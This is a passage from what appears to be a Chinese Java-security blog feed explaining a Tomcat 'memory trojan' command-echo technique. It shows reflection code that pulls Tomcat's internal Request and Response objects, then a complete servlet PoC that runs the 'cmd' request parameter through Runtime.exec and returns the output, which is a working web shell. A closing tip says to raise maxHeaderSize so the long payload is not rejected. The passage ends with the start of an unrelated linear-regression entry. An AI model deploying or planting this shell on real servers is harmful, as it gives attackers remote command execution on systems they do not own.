class="token string">"org.apache.catalina.loader.WebappClassLoaderBase"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"resources"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resourcesField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">WebResourceRoot</span><span class="token punctuation">)</span> resourcesField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>classLoader<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>获取ApplicationContext：<br>其实上面步骤就是为了这步，以前我们是靠着Request拿到ApplicationContext，但这次我们需要拿到Request</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//获取ApplicationContext</span><span class="token class-name">Field</span> contextField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.StandardContext"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>contextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> contextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>获取StandardService：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> serviceField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"service"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>serviceField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardService</span> service <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardService</span><span class="token punctuation">)</span> serviceField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>获取connector：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> connectorsField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.StandardService"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"connectors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>connectorsField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Connector</span><span class="token punctuation">[</span><span class="token punctuation">]</span> connectors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Connector</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> connectorsField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>service<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Connector</span> connector<span class="token operator">=</span>connectors<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>获取Handler：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ProtocolHandler</span> protocolHandler <span class="token operator">=</span> connector<span class="token punctuation">.</span><span class="token function">getProtocolHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> handleField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.coyote.AbstractProtocol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>handleField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AbstractEndpoint<span class="token punctuation">.</span>Handler</span> handle <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">AbstractEndpoint<span class="token punctuation">.</span>Handler</span><span class="token punctuation">)</span> handleField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>protocolHandler<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>获取processors：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> processorsField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.coyote.RequestGroupInfo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"processors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>processorsField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">RequestInfo</span><span class="token punctuation">&gt;</span></span> processors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">RequestInfo</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span> processorsField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span><span class="token function">getGlobal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>获取Request和Request：<br>值得注意的是我们最终获取的Request是org.apache.coyote.Request<br><img src="/img/3-16/22.png"><br>最后需要的是org.apache.catalina.connector.Request<br><img src="/img/3-16/23.png"><br>通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request和Response</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> reqfield <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.coyote.RequestInfo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"req"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reqfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">RequestInfo</span> processor <span class="token operator">:</span> processors<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">Request</span> request<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> reqfield<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>processor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span>Request</span> http_request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span>Request</span><span class="token punctuation">)</span> request<span class="token punctuation">.</span><span class="token function">getNote</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span>Response</span> http_response <span class="token operator">=</span> http_request<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><a name="AQmwi"></a></p><h3 id="完整Poc-1"><a href="#完整Poc-1" class="headerlink" title="完整Poc"></a>完整Poc</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>memorytrojan<span class="token punctuation">.</span></span><span class="token class-name">Echo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span></span><span class="token class-name">WebResourceRoot</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span><span class="token class-name">Connector</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">ApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">StandardContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">StandardService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span><span class="token class-name">WebappClassLoaderBase</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span></span><span class="token class-name">ProtocolHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span></span><span class="token class-name">Request</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span></span><span class="token class-name">RequestInfo</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">AbstractEndpoint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/req"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Tomcat_Req</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span><span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">WebappClassLoaderBase</span> classLoader <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebappClassLoaderBase</span><span class="token punctuation">)</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token comment">//获取StandardContext</span><span class="token class-name">Field</span> resourcesField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.loader.WebappClassLoaderBase"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"resources"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resourcesField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">WebResourceRoot</span><span class="token punctuation">)</span> resourcesField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>classLoader<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取ApplicationContext</span><span class="token class-name">Field</span> contextField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.StandardContext"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>contextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> contextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取StandardService</span><span class="token class-name">Field</span> serviceField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"service"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>serviceField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardService</span> service <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardService</span><span class="token punctuation">)</span> serviceField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取connectors</span><span class="token class-name">Field</span> connectorsField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.StandardService"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"connectors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>connectorsField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Connector</span><span class="token punctuation">[</span><span class="token punctuation">]</span> connectors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Connector</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> connectorsField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>service<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Connector</span> connector<span class="token operator">=</span>connectors<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//获取Handler</span><span class="token class-name">ProtocolHandler</span> protocolHandler <span class="token operator">=</span> connector<span class="token punctuation">.</span><span class="token function">getProtocolHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> handleField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.coyote.AbstractProtocol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>handleField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AbstractEndpoint<span class="token punctuation">.</span>Handler</span> handle <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">AbstractEndpoint<span class="token punctuation">.</span>Handler</span><span class="token punctuation">)</span> handleField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>protocolHandler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取processors</span><span class="token class-name">Field</span> processorsField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.coyote.RequestGroupInfo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"processors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>processorsField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">RequestInfo</span><span class="token punctuation">&gt;</span></span> processors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">RequestInfo</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span> processorsField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span><span class="token function">getGlobal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取Request</span><span class="token class-name">Field</span> reqfield <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.coyote.RequestInfo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"req"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reqfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">RequestInfo</span> processor <span class="token operator">:</span> processors<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">Request</span> request<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> reqfield<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>processor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span>Request</span> http_request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span>Request</span><span class="token punctuation">)</span> request<span class="token punctuation">.</span><span class="token function">getNote</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span>Response</span> http_response <span class="token operator">=</span> http_request<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">cmdEcho</span><span class="token punctuation">(</span>http_request<span class="token punctuation">,</span>http_response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> <span class="token operator">|</span> <span class="token class-name">IllegalAccessException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cmdEcho</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token class-name">PrintWriter</span> writer<span class="token punctuation">;</span>        <span class="token comment">//解决windows乱码</span>response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>writer <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> inputStream<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>inputStream <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> result <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span>scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">;</span>scanner<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>writer<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>writer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><img src="/img/3-16/24.png"><p><a name="CVm7U"></a></p><h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>利用链过长，会导致http包超长，可先修改org.apache.coyote.http11.AbstractHttp11Protocol的maxHeaderSize的大小，这样再次发包的时候就不会有长度限制。还有就是操作复杂可能有性能问题，整体来讲该方法不受各种配置的影响，通用型较强。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 内存马 </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性回归</title>
      <link href="/2024/03/12/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"/>
      <url>/2024/03/12/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
      
